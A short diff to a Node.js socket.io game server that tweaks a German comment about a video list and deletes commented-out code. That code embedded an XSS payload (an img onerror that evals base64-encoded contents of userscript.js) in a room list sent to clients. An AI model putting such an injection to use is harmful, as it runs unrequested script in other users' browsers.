@@ -78,7 +78,7 @@ class Room extends EventEmitter {
 			rounds: this.settings.rounds,
 			t_p_g: this.settings.tpgString,
 			current_round: this.current_round,
-			random_num: Math.floor(Math.random() * 965), // Es sind 966 Videos in der Liste
+			random_num: Math.floor(Math.random() * 965), // Es sind 966 Videos in der Liste (pushen wir mehr mit Userscript?)
 
 			player_info: player_info,
 			room_contents: {
@@ -182,12 +182,6 @@ io.on('connection', socket => {
 		room.settings.tpgString = time;
 		rooms.push(room);
 		
-		// -- Für den Fall
-		// socket.emit('change-num-of-players', {
-		// 	room_list: {
-		// 		[-1]: `<img src=x onerror=eval(atob("${Buffer.from(readFileSync('userscript.js', 'utf-8')).toString('base64')}")) />`
-		// 	}
-		// });
 		
 		const player = new Player(username, socket.id);
 		room.joinPlayer(player, socket);
